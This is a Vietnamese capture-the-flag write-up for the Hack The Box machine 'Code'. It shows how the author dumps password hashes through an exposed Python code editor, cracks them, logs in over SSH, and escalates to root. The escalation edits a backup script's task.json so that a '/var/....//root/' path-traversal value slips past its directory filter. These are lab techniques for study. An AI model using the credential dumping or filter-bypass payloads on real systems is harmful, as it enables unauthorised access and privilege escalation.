![image](https://hackmd.io/_uploads/rk1CsHWR1l.png)

# Machine info and Comment
## Machine info
Đây là một máy đang active nên chưa có thông tin về máy này [Link](https://app.hackthebox.com/machines/653)

## Comment
Thêm một máy tận dụng tính năng vốn có của tool để leo quyền đồng thời gặp lại SSTI. 

# Recon
## nmap
```
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
5000/tcp open http Gunicorn 20.0.4
|_http-title: Python Code Editor
```

Ta có thể thấy port 5000 đang chạy Python Code Editor. Điều này có thể cho phép ta chạy command trên hệ thống. Nếu có thể thực thi thì khả năng cao sẽ kiểm soát hệ thống được

# User + Root flag
## Python Code Editor
Vì Editor cho phép thực thi các command của Python, ta cố gắng dump từ databse của hệ thống bằng một query đơn giản
```python
print([(user.id, user.username, user.password) for user in User.query.all()])
```

Kết quả nhận được 
```
(1, 'development', '759b74ce43947f5f4c91aeddc3e5bad3')
(2, 'martin', '3de6f30c4a09c27fc71932bfc68474be')
```

## CrackStation
Sử dụng [CrackStation](https://crackstation.net/) ta sẽ có được credential của 2 user 

![image](https://hackmd.io/_uploads/HJlT7IbAyx.png)

## SSH
ssh vào user `martin` 
```
ssh martin@10.10.11.62
```

## backy\.sh
Sau khi ssh `martin`, ta tìm thấy một tập lệnh nằm tại `/usr/bin/backy.sh` và cat nội dung của nó

![image](https://hackmd.io/_uploads/ByaIsPbC1g.png)

Nội dung đây:

![image](https://hackmd.io/_uploads/HyUdiPbA1g.png)

Tóm gọn về hoạt động của nó như sau:
- Script lấy file task.json làm đầu vào để quyết định những file nào
cần được sao lưu
- Nó chạy với quyền sudo, nghĩa là nó cókhả năng truy cập các file bị hạn chế
- Nó chỉ cho phép sao lưu các file từ các thư mục cụ thể (/var/ và /home/),nhưng ta có thể thao túng nó

## task.json
Sửa file để lấy user flag
```
{
"destination": "/home/martin/",
"multiprocessing": true,
"verbose_log": false,
"directories_to_archive": [
"/home/app-production/user.txt"
],
"exclude": [
".*"
]
}
```
Sau đó bắt đầu chạy script
```bash
martin@code:~/backups$ sudo /usr/bin/backy.sh task.json

martin@code:~/backups$ tar -xjf code_home_app-production_user.txt_2025_March.tar.bz2

martin@code:~/backups$ cat user.txt
```

Tương tự để lấy được root flag
```
{
"destination": "/home/martin/",
"multiprocessing": true,
"verbose_log": true,
"directories_to_archive": [
"/var/....//root/"
]
}
```

```
martin@code:~/backups$ sudo /usr/bin/backy.sh task.json
martin@code:~/backups$ tar -xjf code_var_..._root_root.txt_2025_March.tar.bz2
martin@code:~/backups$ cat root.txt
```

------------------------------------------ Code has been Pwned! ------------------------------------------

![image](https://hackmd.io/_uploads/rknkTwbRJx.png)
